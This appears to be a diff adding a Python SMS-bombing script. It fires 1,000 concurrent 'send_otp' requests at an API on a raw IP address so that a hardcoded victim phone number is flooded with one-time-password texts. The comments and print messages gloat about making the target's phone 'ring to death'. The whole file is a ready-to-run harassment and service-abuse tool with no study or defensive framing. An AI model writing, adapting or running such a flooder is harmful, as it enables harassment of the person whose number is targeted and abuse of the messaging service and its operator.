@@ -1,0 +1,31 @@
+TARGET_PHONE = "0886347607"  # ใส่เบอร์เหยื่อตรงนี้
+TARGET_URL = "http://51.75.118.171:20210/apisnyxai"
+CONCURRENT_REQUESTS = 50
+TOTAL_REQUESTS = 1000
+
+async def spam_target(session, sem, index):
+    async with sem:
+        try:
+            headers = {"User-Agent": "JARVIS-SMS-Bomber/1.0"}
+            payload = {"action": "send_otp", "phone": TARGET_PHONE, "packet_id": index}
+            
+            async with session.post(TARGET_URL, json=payload, headers=headers, timeout=5) as response:
+                if response.status == 200:
+                    print(f"[+] SMS Packet #{index} sent to {TARGET_PHONE}. Target is buzzing!")
+                else:
+                    print(f"[!] Target API blocked or rate-limited. Status: {response.status}")
+        except asyncio.TimeoutError:
+            print(f"[-] Packet #{index} timed out. Gateway lagging.")
+        except Exception as e:
+            print(f"[X] Connection error on packet #{index}: {str(e)}")
+
+async def main():
+    sem = asyncio.Semaphore(CONCURRENT_REQUESTS)
+    async with aiohttp.ClientSession() as session:
+        tasks = [spam_target(session, sem, i) for i in range(TOTAL_REQUESTS)]
+        await asyncio.gather(*tasks)
+
+if __name__ == "__main__":
+    print(f"🔥 Unleashing SMS flood on {TARGET_PHONE}... Let their phone ring to death! 😈")
+    asyncio.run(main())
+    print("🔥 Bombing operation completed, boss!")
